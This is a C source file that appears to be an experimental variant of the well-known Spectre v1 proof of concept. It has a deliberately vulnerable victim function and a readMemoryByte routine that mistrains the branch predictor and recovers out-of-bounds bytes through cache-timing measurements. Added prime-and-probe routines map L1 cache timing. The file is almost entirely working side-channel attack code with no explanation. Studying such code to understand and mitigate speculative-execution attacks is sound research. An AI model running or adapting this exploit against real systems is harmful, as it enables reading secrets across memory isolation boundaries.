#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define DISTANCE 256
/* Intel 32KB L1 cache consists of 8-way 64 sets, each has 64 bytes line */
#define WAY 8
#define SET 64
#define LINE 64 // bytes

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[LINE];
uint8_t array1[WAY * SET * LINE] = { /* L1 Cache Size */
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16 // array1[15]
};
// array1[16] : time1
// array1[17] : time2
// array1[18] : i
// array1[19] : j
// array1[20] : junk
uint8_t unused2[LINE];
uint8_t array2[WAY * SET * LINE];

char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp += array2[array1[x] * LINE];
	printf("index%02d is %d\n", x, array1[x]);
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */

int flush_all() {
	for(array1[18] = 0 ; array1[18] < SET ; array1[18]++){
		array1[16] = __rdtscp(&array1[20]);
		for(array1[19] = 0 ; array1[19] < WAY ; array1[19]++){
      		_mm_clflush( & array1[(array1[18] + array1[19] * SET) *  LINE]);
		}
		array1[17] = __rdtscp(&array1[20]) - array1[16];
		printf("set%02d time is %d\n",array1[18],array1[17]);
	}
	return array1[20];
}

int prime() {
	for(array1[18] = 0 ; array1[18] < SET ; array1[18]++){
		printf("set %02d\n", array1[18]);
		for(array1[19] = 0 ; array1[19] < WAY ; array1[19]++){
			array1[16] = __rdtscp(&array1[20]);
			array1[20] += array1[ (array1[18] + array1[19] * SET) *  LINE];
			array1[17] = __rdtscp(&array1[20]) - array1[16];
			printf("line %05u time is %d\n", (array1[18] + array1[19] * SET) *  LINE, array1[17]);
		}
		//printf("set%02d time is %d\n",array1[18],array1[17]);
	}
	return array1[20];
}


/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {


    /* Prime over L1 Cache */
    prime();


    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * DISTANCE];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main (int argc, const char ** argv) {
	flush_all();
	printf("prime\n");
	prime();
	victim_function(11);
	victim_function(12);
	victim_function(13);
	victim_function(14);
	victim_function(15);
	printf("probe\n");
	prime();
}
